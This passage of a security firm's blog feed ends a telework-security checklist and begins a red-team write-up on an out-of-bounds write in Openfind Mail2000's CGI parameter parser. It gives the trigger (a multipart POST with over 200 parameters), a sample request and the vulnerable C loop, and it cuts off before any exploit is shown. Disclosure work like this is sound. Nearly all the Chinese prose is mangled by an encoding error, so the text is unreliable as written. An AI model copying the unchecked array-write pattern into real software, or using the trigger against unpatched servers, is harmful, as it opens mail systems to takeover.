  &lt;li&gt;&lt;strong&gt;‰∏çÂêåÁ≥ªÁµ±Â∏≥Ëôü‰ΩøÁî®‰∏çÂêåÂØÜÁ¢º&lt;/strong&gt;ÔºöÈÄôÂÄãÂú®ÂæàÂ§öÊ¨°ÊºîË¨õ‰∏≠ÈÉΩÊúâÊèêÂà∞ÔºåÂª∫Ë≠∞ÊØèÂÄãÁ≥ªÁµ±ÁöÜ‰ΩøÁî®‰∏çÂêåÂØÜÁ¢ºÔºåÈò≤Ê≠¢ÊíûÂ∫´ÊîªÊìä„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Â∏≥ËôüÈñãÂïü 2FA / MFA&lt;/strong&gt;ÔºöËã•Á≥ªÁµ±ÂÖ∑ÂÇô 2FA / MFA Ê©üÂà∂ÔºåÂãôÂøÖÈñãÂïüÔºåÁÇ∫Â∏≥ËôüÂ§ö‰∏ÄÂ±§‰øùË≠∑„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Á∂≤Ë∑Ø‰ΩøÁî®&quot;&gt;Á∂≤Ë∑Ø‰ΩøÁî®&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ÈÅøÂÖç‰ΩøÁî®ÂÖ¨Áî® Wi-Fi ÈÄ£Êé•ÂÖ¨Âè∏Á∂≤Ë∑Ø&lt;/strong&gt;ÔºöÂÖ¨ÁúæÂÖ¨Áî®Á∂≤Ë∑ØÊòØÁõ∏Áï∂Âç±Èö™ÁöÑÔºåÊÅêË¢´ÂÅ¥ÈåÑÊàñÁ´ÑÊîπ„ÄÇËã•ÂøÖË¶ÅÊôÇÂèØ‰ΩøÁî®ÊâãÊ©üÁÜ±ÈªûÊàñÈÄèÈÅé VPN ÈÄ£Êé•Á∂≤ÈöõÁ∂≤Ë∑Ø„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Á¶ÅÊ≠¢‰ΩøÁî®ÂÖ¨Áî®ÈõªËÖ¶ÁôªÂÖ•ÂÖ¨Âè∏Á≥ªÁµ±&lt;/strong&gt;ÔºöÂ§ñÈù¢ÁöÑÂÖ¨Áî®ÈõªËÖ¶Èõ£Á¢∫‰øùÊ≤íÊúâÂæåÈñÄ„ÄÅKeylogger ‰πãÈ°ûÁöÑÊÉ°ÊÑèÁ®ãÂºèÔºå‰∏ÄÂÆöË¶ÅÁ¶ÅÊ≠¢‰ΩøÁî®ÂÖ¨Áî®ÈõªËÖ¶‰æÜÁôªÂÖ•‰ªª‰ΩïÁ≥ªÁµ±„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Á¢∫Ë™çÈÄ£Á∑öË£ùÁΩÆÊòØÂê¶ÂèØÂèñÂæóÂÖßÁ∂≤ IP ‰ΩçÂùÄ&lt;/strong&gt;ÔºöÁ¢∫Ë™çÂÖßÁ∂≤ IP ‰ΩçÂùÄÊòØÂê¶ÁÑ°Ë™§ÔºåÊòØÂê¶ËÉΩÂ§†Ê≠£Â∏∏Â≠òÂèñÂÖ¨Âè∏ÂÖßÈÉ®Á≥ªÁµ±„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Á¢∫Ë™çÈÄ£Á∑öÁöÑÂ∞çÂ§ñ IP ‰ΩçÂùÄ&lt;/strong&gt;ÔºöÁ¢∫Ë™çÈÄ£Á∑öËá≥Á∂≤ÈöõÁ∂≤Ë∑ØÁöÑ IP ‰ΩçÂùÄÊòØÂê¶ÁÇ∫È†êÊúüÔºåÂ∞§ÂÖ∂ÊòØË≥áÂÆâÊúçÂãôÂÖ¨Âè∏ÔºåÂ∞çÂÆ¢Êà∂ÈÄ£Á∑öÁöÑ IP ‰ΩçÂùÄËã•ÊúâÈåØË™§ÔºåÂèØËÉΩÈáÄÊàêÈùûÂ∏∏Âö¥ÈáçÁöÑÊêçÂÆ≥„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÔºàÈÅ∏ÊìáÊÄßÔºâ&lt;strong&gt;ÂÆâË£ùÂÄã‰∫∫ÈõªËÖ¶Èò≤ÁÅ´ÁâÜ&lt;/strong&gt;ÔºöÂÄã‰∫∫Èò≤ÁÅ´ÁâÜÂèØ‰ª•Âü∫Êú¨Áõ£ÊéßÊúâÁÑ°ÂèØÁñëÁ®ãÂºèÊÉ≥Â∞çÂ§ñÈÄ£Á∑ö„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÔºàÈÅ∏ÊìáÊÄßÔºâ&lt;strong&gt;Êé°Áî® E2EE ÈÄöË®äÂ∑•ÂÖ∑&lt;/strong&gt;ÔºöÁõÆÂâç‰ºÅÊ•≠ÈÉΩÊúÉ‰ΩøÁî®Èõ≤Á´ØÈÄöË®äËªüÈ´îÔºåÈÄöË®äËªüÈ´îÂª∫Ë≠∞Êé°Áî®Êúâ E2EE (End-to-End Encryption)ÔºåÂ¶ÇÊ≠§ÂèØ‰ª•Á¢∫‰øùÂÖ¨Âè∏ÂÖßÁöÑÊ©üÊïèÈÄöË®äÂÖßÂÆπÂè™ÊúâÂÖßÈÉ®‰∫∫Âì°ÊâçËÉΩËß£ÂØÜÔºåÂ∞±ÈÄ£Âπ≥Âè∞ÂïÜ‰πüÁÑ°Ê≥ïÂ≠òÂèñ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÔºàÈÅ∏ÊìáÊÄßÔºâ&lt;strong&gt;Â∑•‰ΩúÊôÇÈóúÈñâ‰∏çÂøÖË¶ÅÁöÑÈÄ£Á∑ö&lt;/strong&gt;ÔºàÂ¶ÇËóçÁâôÁ≠âÔºâÔºöÈÉ®ÂàÜË≥áÂÆâÂ∞àÂÆ∂Ë°®Á§∫ÔºåÂª∫Ë≠∞Âú®Â∑•‰ΩúÊôÇÂ∞áÈõªËÖ¶ÁöÑÈùûÂøÖË¶ÅÈÄ£Á∑öÁÆ°ÈÅìÂÖ®Êï∏ÈóúÈñâÔºåÂ¶ÇËóçÁâôÁ≠âÔºåÂú®Â§ñÈÉ®ÂÖ¨ÁúæÁí∞Â¢ÉÊàñË®±ÊúâÂøÉ‰∫∫Â£´ÂèØ‰ª•ÈÄèÈÅéËóçÁâô exploit ÊîªÊìäÂÄã‰∫∫Ë£ùÁΩÆ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;Ë≥áÊñôÁÆ°ÁêÜ&quot;&gt;Ë≥áÊñôÁÆ°ÁêÜ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Âè™ÁïôÂ≠òÂú®ÂÖ¨Âè∏Ë®≠ÂÇô&lt;/strong&gt;ÔºöÂÖ¨Âè∏ÁöÑÊ©üÊïèË≥áÊñô„ÄÅÊñá‰ª∂Á≠âÔºåÂøÖÈ†àÂè™ÁïôÂ≠òÂú®ÂÖ¨Âè∏Ë®≠ÂÇô‰∏≠ÔºåÈÅøÂÖçË≥áÊñôÂ§ñÊ¥©‰ª•ÂèäÁÆ°ÁêÜÂïèÈ°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Á®ΩÊ†∏Ë®òÈåÑ&lt;/strong&gt;ÔºöË®òÈåÑÊ©üÊïèË≥áÊñôÁöÑÂ≠òÊîæ„ÄÅ‰øÆÊîπ„ÄÅÊìÅÊúâ‰∫∫Á≠âË≥áË®ä„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÈáçË¶ÅÊñá‰ª∂Âä†ÂØÜ&lt;/strong&gt;ÔºöÈáçË¶ÅÁöÑÊñá‰ª∂ÂøÖÈ†àÂä†ÂØÜÔºå‰∏îÂØÜÁ¢º‰∏çÂæóÂ≠òÊîæÂú®Âêå‰∏ÄÁõÆÈåÑ„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;‰ø°‰ª∂ÈôÑ‰ª∂Âä†ÂØÜ&lt;/strong&gt;ÔºåÂØÜÁ¢ºÈÄèÈÅéÂè¶‰∏ÄÁÆ°ÈÅìÂÇ≥ÈÅûÔºöÈÉµ‰ª∂ÁöÑÈôÑ‰ª∂Èô§‰∫ÜË¶ÅÂä†ÂØÜ‰πãÂ§ñÔºåÂØÜÁ¢ºÂøÖÈ†à‰ΩøÁî®Âè¶‰∏ÄÁÆ°ÈÅìÂÇ≥ÈÅû„ÄÇ‰æãÂ¶ÇÁï∂Èù¢ÂëäÁü•„ÄÅ‰∫ãÂâçÁ¥ÑÂÆö„ÄÅÈÄèÈÅé E2EE Âä†ÂØÜÈÄöÈÅì„ÄÅÊàñËÄÖÊòØÈÄèÈÅéÈùûÁ∂≤Ë∑ØÊñπÂºèÁµ¶‰∫à„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ÂÇô‰ªΩË≥áÊñô&lt;/strong&gt;ÔºöÊ©üÊïèË≥áÊñô‰∏ÄÂÆöË¶ÅÂÇô‰ªΩÔºåÂèØ‰ª•ÈÅµÂæ™„Äå3-2-1 Backup Strategy„ÄçÔºö‰∏â‰ªΩÂÇô‰ªΩ„ÄÅÂÖ©Á®ÆÂ™íÈ´î„ÄÅ‰∏ÄÂÄãÊîæÁΩÆÁï∞Âú∞„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ÂØ¶È´îÂÆâÂÖ®&quot;&gt;ÂØ¶È´îÂÆâÂÖ®&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Èõ¢ÈñãÈõªËÖ¶ÊôÇÁ´ãÂàªÈéñÂÆöËû¢Âπï&lt;/strong&gt;ÔºöÈõ¢ÈñãÈõªËÖ¶ÁöÑÁøíÊÖ£ÊòØÈ¶¨‰∏äÈÄ≤ÂÖ•Ëû¢Âπï‰øùË≠∑Á®ãÂºè‰∏¶‰∏îÈéñÂÆöÔºå‰∏çÂ∞ëÊúãÂèãÊòØÊîæËëóËÆì‰ªñÁ≠â‰ªñËá™Â∑±ÈÄ≤ÂÖ•ÈéñÂÆöÔºå‰ΩÜÈÄôÂÄãÊôÇÈñìÂ∑ÆÊúâÂøÉ‰∫∫Â£´Â∑≤Á∂ìÂèØ‰ª•ÂÆåÊàêÊîªÊìä„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Á¶ÅÊ≠¢ÊèíÂÖ•‰æÜË∑Ø‰∏çÊòéÁöÑÈö®Ë∫´Á¢üÊàñË£ùÁΩÆ&lt;/strong&gt;ÔºöÁ§æ‰∫§Â∑•Á®ãÁöÑÊâãÊ≥ï‰πã‰∏ÄÔºåÂ∞±ÊòØËÆìÂêå‰ªÅÊèíÂÖ•ÊÉ°ÊÑèÁöÑ USBÔºåÁîöËá≥ÊúâÂèØËÉΩÊëßÊØÄÈõªËÖ¶ÔºàBad USB, USB KillerÔºâ„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Ê≥®ÊÑèÂ§ñ‰∫∫ÂÅ∑Á™∫Ëû¢ÂπïÊàñÁ¢∞Ëß∏Ë®≠ÂÇô&lt;/strong&gt;ÔºöËã•Â∏∏Âú®Â§ñÂ∑•‰ΩúËôïÊñºÂÖ¨ÂÖ±Á©∫ÈñìÔºåÂèØ‰ª•ËÄÉÊÖÆÊé°Ë≥ºËû¢ÂπïÈò≤Á™∫Áâá„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;‰∏çÊîæÁΩÆÈõªËÖ¶Ë®≠ÂÇôÂú®Ëªä‰∏ä&lt;/strong&gt;ÔºöÈõñÁÑ∂Âè∞ÁÅ£Ê≤ªÂÆâ‰∏çÈåØÔºå‰ΩÜ‰πüÊòØ‰∏çÂ∞ëÁ≠ÜÈõªÂú®Ëªä‰∏äÈÅ≠Á´äÔºåÈáçË¶ÅË≥áÁî¢Ë®òÂæóÈö®Ë∫´ÊîúÂ∏∂ÔºåÊàñËÄÖÊîæÁΩÆÂú®Èö±ÂØÜËôï„ÄÇ&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Â∞áÂ∑•‰ΩúÂçÄÂüüÈóúÈñÄÊàñÈéñ‰∏ä&lt;/strong&gt;ÔºöËã•Âú®Ëá™Â∑±ÁöÑÂ∑•‰ΩúÂçÄÂüüÔºåÁÇ∫‰∫ÜÁà≠ÂèñÊõ¥Â§öÊôÇÈñìÊáâËÆäÁ™ÅÁôºÁãÄÊ≥ÅÔºåÂª∫Ë≠∞Â∞áÂ∑•‰ΩúÂçÄÂüüÁöÑÈñÄÈóúÈñâÊàñËÄÖ‰∏äÈéñ„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;tldr-Èò≤Áñ´ÂêåÊôÇ‰πüÂà•ÂøΩË¶ñË≥áË®äÂÆâÂÖ®&quot;&gt;TL;DR Èò≤Áñ´ÂêåÊôÇ‰πüÂà•ÂøΩË¶ñË≥áË®äÂÆâÂÖ®ÔºÅ&lt;/h2&gt;

&lt;p&gt;Á∂≤Ë∑ØÁöÑÊîªÈò≤Â∞±ÊòØ‰∏ÄÂ†¥Êà∞Áà≠ÔºåÂ¶ÇÊûú‰∏çÂæûÊîªÊìäËÄÖÁöÑÈù¢ÂêëÂéªÊÄùËÄÉÈò≤Á¶¶Á≠ñÁï•Ôºå‰∏ç‰ΩÜÁÑ°Ê≥ïÊúâÊïàÁöÑÊ∏õÁ∑©ÊîªÊìäÔºåÊõ¥ÂèØËÉΩÂú®ÂÖ®‰∏ñÁïåÁñ´ÊÉÖÈÄêÊº∏Â§±ÊéßÁöÑÁï∂‰∏ãÔºåËÆìÊÉ°ÊÑè‰∫∫Â£´ÈÄèÈÅéÈÄôÊ®£ÁöÑÊôÇÊ©üÊîªÊìäÈÅ†Ë∑ùÂ∑•‰ΩúÁöÑ‰ºÅÊ•≠„ÄÇÊúüÊúõÊàëÂÄëÁöÑÁ∂ìÈ©óÂàÜ‰∫´ËÉΩÂ§†Áµ¶‰ºÅÊ•≠‰∏Ä‰∫õÂü∫Êú¨ÁöÑÊåáÂºïÔºå‰πüÂ∏åÊúõÂ§©ÁÅΩ‰∫∫Á¶çËÉΩÂ§†ÂÑòÈÄüÊ∂àÂΩå„ÄÇÂè∞ÁÅ£Âä†Ê≤πÔºÅ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÈñãÊîæ VPN ÊúçÂãôÂâçÔºåÊ≥®ÊÑèÂ∏≥ËôüÁÆ°ÁêÜ‰ª•ÂèäÂÖßÁ∂≤ÂàáÂâ≤ÈöîÈõ¢ÔºåÈÅøÂÖçÈÄèÈÅé VPN Â≠òÂèñÂÖßÁ∂≤‰ªªÊÑè‰∏ªÊ©ü„ÄÇ&lt;/li&gt;
  &lt;li&gt;Èõ≤Á´Ø„ÄÅÁ∂≤Ë∑ØÊúçÂãôÂãôÂøÖ‰ΩøÁî®Áç®‰∏ÄÁÑ°‰∫åÈï∑ÂØÜÁ¢ºÔºå‰∏¶ÈñãÂïü MFA / 2FA Â§öÂõ†Â≠êË™çË≠â„ÄÇ&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®Èõ≤Á´ØÊúçÂãôÊôÇÂãôÂøÖÁõ§ÈªûÂ≠òÂèñÊ¨äÈôêÔºåÈÅøÂÖçÊñá‰ª∂ÈÄ£ÁµêÂèØË¢´‰ªªÊÑè‰∫∫Â≠òÂèñ„ÄÇ&lt;/li&gt;
  &lt;li&gt;Ê≥®ÊÑèË®≠ÂÇôÈÅ∫Â§±„ÄÅÁ´äÂèñ„ÄÅÁ§æ‰∫§Â∑•Á®ãÁ≠âÂØ¶È´îÂÆâÂÖ®Ë≠∞È°å„ÄÇ&lt;/li&gt;
  &lt;li&gt;Á∂≤Ë∑ØÊòØÂç±Èö™ÁöÑÔºåË´ã‰ΩøÁî®ÂèØ‰ø°Ë≥¥ÁöÑÁ∂≤Ë∑ØÔºå‰∏¶Âú®ÈÄöË®ä„ÄÅÂÇ≥Ëº∏ÊôÇÊé°Áî®Âä†ÂØÜÊñπÂºèÈÄ≤Ë°å„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2020/03/04/telework-security/</link>
                <guid>https://devco.re/blog/2020/03/04/telework-security</guid>
                <pubDate>Wed, 04 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>È£õÈ¥øÂÇ≥Êõ∏ - Á¥ÖÈöäÊºîÁ∑¥‰∏≠ÁöÑÊï∏‰ΩçÊìÑÈ¥ø</title>
                <description>&lt;p&gt;ÈÉµ‰ª∂Á≥ªÁµ±‰ΩúÁÇ∫Â§ßÈÉ®ÂàÜ‰ºÅÊ•≠‰∏ªË¶ÅÁöÑË≥áË®ä‰∫§ÊèõÊñπÂºèÔºåÂú®Êà∞Áï•‰∏ä‰ΩîÊúâ‰∫ÜËàâË∂≥ËºïÈáçÁöÑÂú∞‰Ωç„ÄÇÊéåÊéß‰∫ÜÈÉµ‰ª∂‰º∫ÊúçÂô®‰∏çÂÉÖÂèØ‰ª•Á´äËÅΩÈÉµ‰ª∂ÁöÑÂÖßÂÆπÔºåÁîöËá≥Ë®±Â§öÈáçË¶ÅÊñá‰ª∂ÈÉΩÂèØ‰ª•Âú®ÈÉµ‰ª∂Á≥ªÁµ±‰∏≠ÊâæÂà∞Ôºå‰ΩøÂæóÈß≠ÂÆ¢ËÉΩÂ§†Êõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÊª≤ÈÄè„ÄÇÊú¨ÁØáÊñáÁ´†Â∞á‰ªãÁ¥πÁ†îÁ©∂ÁµÑÂú® Openfind Mail2000 ÈÄôÂ•óËªüÈ´î‰∏äÁôºÁèæÁöÑË®òÊÜ∂È´îÊºèÊ¥ûÔºå‰ª•ÂèäÂà©Áî®ÈÄôÂÄãÊºèÊ¥ûÁöÑÊîªÊìäÊâãÊ≥ï„ÄÇ
&lt;strong&gt;Ê≠§ÊºèÊ¥ûÁÇ∫ 2018 Âπ¥ÊôÇÁôºÁèæÔºåÁï∂ÊôÇÂ∑≤ÈÄöÂ†± Openfind ‰∏¶‰∏îËøÖÈÄüË¢´‰øÆË£úÔºåÂêåÊôÇ‰πüÂ∑≤ÂçîÂä©Áõ∏ÈóúÁî®Êà∂ÈÄ≤Ë°åÊõ¥Êñ∞„ÄÇ&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;openfind-mail2000&quot;&gt;Openfind Mail2000&lt;/h2&gt;
&lt;p&gt;Mail2000 ÊòØ‰∏ÄÂ•óÁî±Âè∞ÁÅ£Âª†ÂïÜ Openfind ÊâÄÈñãÁôºÔºåÁ∞°ÂñÆÊòìÁî®ÁöÑÈõªÂ≠êÈÉµ‰ª∂Á≥ªÁµ±ÔºåË¢´Âª£Ê≥õ‰ΩøÁî®ÊñºÂè∞ÁÅ£ÁöÑÂÖ¨ÂÆ∂Ê©üÈóú„ÄÅÊïôËÇ≤Ê©üÊßãÔºåÂ¶ÇÂè∞ÂåóÂ∏ÇÊïôËÇ≤Â±Ä„ÄÅ‰∏≠ÁßëÈô¢Ôºå‰ª•ÂèäËá∫ÁÅ£ÁßëÊäÄÂ§ßÂ≠∏ÈÉΩÊúâ‰ΩøÁî® Mail2000 ‰ΩúÁÇ∫‰∏ªË¶ÅÁöÑÈÉµ‰ª∂‰º∫ÊúçÂô®„ÄÇÂ∏∏Ë¶ãÁöÑÂÖ•Âè£‰ªãÈù¢Â¶Ç‰∏ãÔºö
&lt;img src=&quot;/assets/img/blog/20191223/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄôÊ¨°ÁöÑÊºèÊ¥ûÔºå‰æøÊòØÂæûÈÄôÂÄã Web ‰ªãÈù¢ÔºåÂà©Áî® Binary ÁöÑÊâãÊ≥ïÔºåÊîªÈô∑Êï¥Âè∞‰º∫ÊúçÂô®ÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;‰º∫ÊúçÂô®Êû∂Êßã&quot;&gt;‰º∫ÊúçÂô®Êû∂Êßã&lt;/h2&gt;
&lt;p&gt;Mail2000 Êèê‰æõ‰∫Ü Web ‰ªãÈù¢‰æõÁÆ°ÁêÜÂì°‰ª•Âèä‰ΩøÁî®ËÄÖÊìç‰ΩúÔºå‰πüÂ∞±ÊòØÊâÄË¨ÇÁöÑ WebmailÔºåËÄåÊ≠§Ëôï Openfind ‰ΩøÁî®‰∫Ü CGI (Common Gateway Interface) ÁöÑÊäÄË°ì‰æÜÂØ¶‰Ωú„ÄÇÂ§ßÂ§öÊï∏ Web ‰º∫ÊúçÂô®ÂØ¶Áèæ CGI ÁöÑÊñπÂºèÂ¶ÇÂúñÔºö
&lt;img src=&quot;/assets/img/blog/20191223/2.png&quot; alt=&quot;&quot; /&gt;
È¶ñÂÖàÁî± httpd Êé•ÂèóÂÆ¢Êà∂Á´ØÁöÑË´ãÊ±ÇÂæåÔºåÊ†πÊìöÂ∞çÊáâÁöÑ CGI Ë∑ØÂæëÔºåÂü∑Ë°åÁõ∏Â∞çÊáâÁöÑ CGI Ê™îÊ°à„ÄÇËÄåÂ§ßÂ§öÊï∏ÁöÑÈñãÁôºËÄÖÊúÉÊ†πÊìöÈúÄÊ±ÇÔºåÂ∞áÂ∏∏Ë¶ãÁöÑÂÖ±Áî® function Êí∞ÂØ´Êàê libraryÔºå‰æõ CGI ÂëºÂè´„ÄÇ
ÂæÄÂ∫ïÂ±§‰æÜÁúãÔºåÂÖ∂ÂØ¶ÂèØ‰ª•ÁôºÁèæÔºåÈõñÁÑ∂Á®±ÁÇ∫ Web ‰º∫ÊúçÂô®Ôºå‰ªçÊúâË®±Â§öÂÖÉ‰ª∂ÊòØÂª∫ÊßãÊñº binary ‰πã‰∏äÁöÑÔºÅ‰æãÂ¶Ç httpdÔºåÁÇ∫‰∫ÜÊïàËÉΩÔºåÂ§öÊòØÁî± C/C++ ÊâÄÊí∞ÂØ´ÔºåËÄåÂÖ∂ÂÆÉÂÉèÊòØ library„ÄÅÊì¥ÂÖÖÁöÑ module„ÄÅÂêÑÈ†ÅÈù¢ÁöÑ CGI ‰πüÂ∏∏ÊòØÂ¶ÇÊ≠§„ÄÇÂõ†Ê≠§Ôºåbinary Áõ∏ÈóúÁöÑÊºèÊ¥ûÔºå‰æøÊòØÊàëÂÄëÈÄôÊ¨°ÁöÑÊîªÊìäÁõÆÊ®ôÔºÅ&lt;/p&gt;

&lt;h2 id=&quot;ÊºèÊ¥û&quot;&gt;ÊºèÊ¥û&lt;/h2&gt;

&lt;p&gt;ÈÄôÂÄãÊºèÊ¥û‰ΩçÊñº Openfind ÂØ¶‰ΩúÁöÑ library &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libm2kc&lt;/code&gt; ‰∏≠ÔºåÊ≠§ÂáΩÂºèÂ∫´ÂåÖÂê´‰∫ÜÂêÑÁ®Æ CGI ÈÄöÁî®ÂáΩÂºèÔºåÂ¶ÇÂèÉÊï∏Ëß£ÊûêÂèäÊ™îÊ°àËôïÁêÜÁ≠âÁ≠âÔºåËÄåÈÄôÂÄãÊºèÊ¥ûÂ∞±ÁôºÁîüÂú®ÂèÉÊï∏Ëß£ÊûêÁöÑÈÉ®ÂàÜ„ÄÇÁî±ÊñºÂèÉÊï∏ËôïÁêÜÊòØÂæàÂ∫ïÂ±§‰∏îÂü∫Êú¨ÁöÑÂäüËÉΩÔºåÂõ†Ê≠§ÂΩ±ÈüøÁöÑÁØÑÂúçÈùûÂ∏∏ÁöÑÂ§ßÔºåÂ∞±ÈÄ£ Openfind ÁöÑÂÖ∂ÂÆÉÁî¢ÂìÅ‰πüÂêåÊ®£ÂèóÂΩ±ÈüøÔºÅ
ÈÄôÂÄãÊºèÊ¥ûÁöÑËß∏ÁôºÊ¢ù‰ª∂Â¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;ÊîªÊìäËÄÖ‰ΩøÁî® multipart ÂΩ¢ÂºèÁôºÈÄÅ HTTP POST Ë´ãÊ±Ç&lt;/li&gt;
  &lt;li&gt;POST ÂÇ≥ÈÄÅÁöÑË≥áÊñôÂÖßÂÆπË∂ÖÈÅé 200 È†Ö&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;multipart ÊòØ HTTP ÂçîÂÆö‰∏≠ÔºåÁî®‰æÜËôïÁêÜÂ§öÈ†ÖÊ™îÊ°àÂÇ≥Ëº∏ÊôÇÁöÑ‰∏ÄÁ®ÆÊ†ºÂºèÔºåËàâ‰æãÂ¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content-Type: multipart/form-data; boundary=AaB03x ‚Ä® 

‚Ä®--AaB03x‚Ä®
Content-Disposition: form-data; name=&quot;files&quot;; filename=&quot;file1.txt&quot;‚Ä®
Content-Type: text/plain‚Ä®

‚Ä®... contents of file1.txt ...
‚Ä®--AaB03x--
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ËÄåÂú® libm2kc ‰∏≠Ôºå‰ΩøÁî®‰∫ÜÈô£Âàó‰æÜÂÑ≤Â≠òÂèÉÊï∏Ôºö&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;g_stCGIEnv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;param_cnt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ÈÄôÂÄãÈô£ÂàóÁÇ∫ÂÖ®ÂüüËÆäÊï∏ g_stCGIEnv ‰∏≠ÁöÑ paramÔºåÂú®Â≠òÂÖ• param Èô£ÂàóÊôÇÔºå‰∏¶Ê≤íÊúâÊ™¢Êü•ÊòØÂê¶Â∑≤Ë∂ÖÈÅéÂÆ£ÂëäÁöÑÈô£ÂàóÂ§ßÂ∞èÔºåÂ∞±ÈÄ†Êàê‰∫ÜË∂äÁïåÂØ´ÂÖ•„ÄÇ
&lt;img src=&quot;/assets/img/blog/20191223/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåparam Èô£ÂàóÊâÄÂÑ≤Â≠òÁöÑÁµêÊßãÁÇ∫ÊåáÂêëÂ≠ó‰∏≤‰ΩçÁΩÆÁöÑÊåáÊ®ôÔºåËÄåÈùûÂ≠ó‰∏≤Êú¨Ë∫´&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
